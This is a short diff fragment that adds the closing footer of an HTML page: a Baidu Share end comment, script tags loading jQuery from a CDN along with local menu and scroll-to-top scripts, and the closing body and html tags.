+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
